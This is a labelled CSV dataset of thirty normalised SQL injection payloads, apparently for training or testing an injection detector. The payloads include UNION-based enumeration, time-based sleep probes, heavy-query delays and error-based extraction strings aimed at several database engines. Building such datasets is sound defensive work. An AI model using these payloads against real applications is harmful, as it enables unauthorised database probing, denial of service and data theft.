row_index,payload_norm,label,sqli_type_hint
5820,"1 ) ) as hpxw where 1826 = 1826 union all select null,null,null,null,null,null,null,null#",1,
5821,"1%"" ) ) ) union all select null,null,null,null,null,null--",1,
5822,"select count ( * ) from generate_series ( 1,5000000 ) and '%' = '",1,
5823,"1"" ) where 4951 = 4951",1,
5824,"1' ) ) as kxek where 3429 = 3429 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
5825,-3666' ) where 6386 = 6386 union all select 6386--,1,
5826,1%' and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and '%' = ',1,
5827,1' where 6135 = 6135,1,
5828,1%' ) ) order by 1#,1,
5829,"1' and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and 'dphz' = 'dphz",1,
5830,"1"" where 2547 = 2547 or sleep ( 5 ) #",1,
5831,"-5959"" or 2477 = 1144",1,
5832,1 ) as iqkf where 7780 = 7780,1,
5833,"-6377'|| ( select 'ryin' where 2113 = 2113 union all select 2113,2113,2113#",1,
5834,"1%' ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( '%' = '",1,
5835,"-6945' union all select 5063,5063,5063,5063,5063,5063,5063,5063--",1,
5836,"-1863' ) or make_set ( 9354 = 9354,7185 ) and ( 'whwv' = 'whwv",1,
5837,"1"" and 6969 = ( select 6969 from pg_sleep ( 5 ) )",1,
5838,"1 where 7362 = 7362 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
5839,"1 ) as tkkn where 7832 = 7832 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",1,
5840,"1 ) where 7571 = 7571 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
5841,"1 ) as ujjg where 3125 = 3125 union all select null,null,null,null,null,null#",1,
5842,"1 ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
5843,1' ) ) as dago where 9788 = 9788,1,
5844,"1%"" ) and 9198 = 9198--",1,
5845,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and '%' = '",1,
5846,"select count ( * ) from generate_series ( 1,5000000 ) and ( 'tnvm' like 'tnvm",1,
5847,"1%' and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
5848,"1"" ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( ""ymhg"" = ""ymhg",1,
5849,"-9557%"" ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""%"" = """,1,
